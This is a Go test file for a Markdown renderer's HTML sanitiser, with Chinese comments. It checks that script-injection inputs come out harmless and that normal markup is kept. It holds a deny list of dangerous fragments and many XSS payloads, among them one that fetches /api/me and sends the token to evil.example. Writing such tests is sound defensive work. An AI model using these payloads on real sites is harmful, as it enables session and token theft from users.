package render

import (
	"strings"
	"testing"
)

// 这些片段一旦出现在渲染结果里就意味着存在可执行的注入面。
// 注意 URL 只在属性位置才算危险：剥掉 href 后剩下的纯文本 "javascript:alert(1)" 是无害的。
var dangerous = []string{
	"<script", "</script", "onerror=", "onload=", "onclick=", "onmouseover=",
	"srcdoc", "<iframe", "<object", "<embed",
	"<style", "<form", "<base", "<meta", "expression(", "document.cookie",
	`href="javascript:`, `href="vbscript:`, `href="data:`,
	`src="javascript:`, `src="vbscript:`, `src="data:text/html`,
}

// TestMarkdownStripsActiveContent 覆盖各类通过正文注入脚本的写法，渲染结果必须都无害。
func TestMarkdownStripsActiveContent(t *testing.T) {
	cases := []struct{ name, src string }{
		{"script 块", "<script>alert(1)</script>\n"},
		{"script 带属性", "<script src=\"https://evil.example/x.js\"></script>\n"},
		{"img 事件属性", "hello <img src=x onerror=alert(1)> world\n"},
		{"svg 事件属性", "<svg onload=alert(1)></svg>\n"},
		{"事件属性大小写混合", "<img src=x OnErRoR=alert(1)>\n"},
		{"iframe srcdoc", "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>\n"},
		{"iframe 外链", "<iframe src=\"https://evil.example\"></iframe>\n"},
		{"style 标签", "<style>body{display:none}</style>\n"},
		{"base 标签", "<base href=\"https://evil.example/\">\n"},
		{"meta 跳转", "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">\n"},
		{"form 提交", "<form action=\"https://evil.example\"><input name=x></form>\n"},
		{"链接 javascript:", "[click](javascript:alert(1))\n"},
		{"自动链接 javascript:", "<javascript:alert(1)>\n"},
		{"图片 javascript:", "![x](javascript:alert(1))\n"},
		{"链接大小写混合", "[click](JaVaScRiPt:alert(1))\n"},
		{"链接实体编码", "[click](java&#115;cript:alert(1))\n"},
		{"折断标签绕过", "<scr<script>ipt>alert(1)</script>\n"},
		{"嵌套在围栏外的 script", "正文\n\n<div><script>alert(1)</script></div>\n"},
		{"窃取 token", "<img src=x onerror=\"fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://evil.example/?t='+t))\">\n"},
	}
	for _, c := range cases {
		out, err := Markdown(c.src)
		if err != nil {
			t.Fatalf("%s: 渲染失败: %v", c.name, err)
		}
		lower := strings.ToLower(out)
		for _, d := range dangerous {
			if strings.Contains(lower, d) {
				t.Errorf("%s: 输出仍含危险片段 %q\n输入: %q\n输出: %q", c.name, d, c.src, out)
			}
		}
	}
}

// TestMarkdownKeepsSafeMarkup 这些是正常写作会用到的东西，清洗不能误伤。
func TestMarkdownKeepsSafeMarkup(t *testing.T) {
	cases := []struct {
		name  string
		src   string
		want  []string
		avoid []string
	}{
		{
			name: "围栏代码块（HTML 被转义成文本）",
			src:  "```html\n<script>alert(1)</script>\n```\n",
			want: []string{"&lt;script&gt;", "<pre>", "<code>"},
		},
		{
			name: "标题 id",
			src:  "# 标题\n",
			want: []string{"<h1", "id="},
		},
		{
			name: "GFM 表格",
			src:  "| a | b |\n|---|---|\n| 1 | 2 |\n",
			want: []string{"<table>", "<th>", "<td>"},
		},
		{
			name: "GFM 任务列表复选框",
			src:  "- [x] 完成\n- [ ] 待办\n",
			want: []string{"type=\"checkbox\"", "checked", "disabled"},
		},
		{
			name: "外链图片",
			src:  "![图](https://example.com/a.png)\n",
			want: []string{"<img", "src=\"https://example.com/a.png\"", "alt=\"图\""},
		},
		{
			name: "外链超链接",
			src:  "[站点](https://example.com)\n",
			want: []string{"<a", "href=\"https://example.com\""},
		},
		{
			name: "details/summary 折叠块",
			src:  "<details><summary>展开</summary>内容</details>\n",
			want: []string{"<details>", "<summary>展开</summary>"},
		},
		{
			name: "kbd 与 br",
			src:  "<kbd>Ctrl</kbd><br>下一行\n",
			want: []string{"<kbd>Ctrl</kbd>", "<br>"},
		},
		{
			name: "加粗与行内代码",
			src:  "**粗** 与 `code`\n",
			want: []string{"<strong>粗</strong>", "<code>code</code>"},
		},
	}
	for _, c := range cases {
		out, err := Markdown(c.src)
		if err != nil {
			t.Fatalf("%s: 渲染失败: %v", c.name, err)
		}
		for _, w := range c.want {
			if !strings.Contains(out, w) {
				t.Errorf("%s: 输出缺少 %q\n输入: %q\n输出: %q", c.name, w, c.src, out)
			}
		}
		for _, a := range c.avoid {
			if strings.Contains(out, a) {
				t.Errorf("%s: 输出不该含 %q\n输出: %q", c.name, a, out)
			}
		}
	}
}

func TestMarkdownKeepsSiteImage(t *testing.T) {
	out, err := Markdown("![shot](/a/alice/0123456789abcdef0123456789abcdef.png)\n")
	if err != nil {
		t.Fatalf("渲染失败: %v", err)
	}
	if !strings.Contains(out, `src="/a/alice/0123456789abcdef0123456789abcdef.png"`) {
		t.Fatalf("本站图片被剥掉了: %q", out)
	}
}
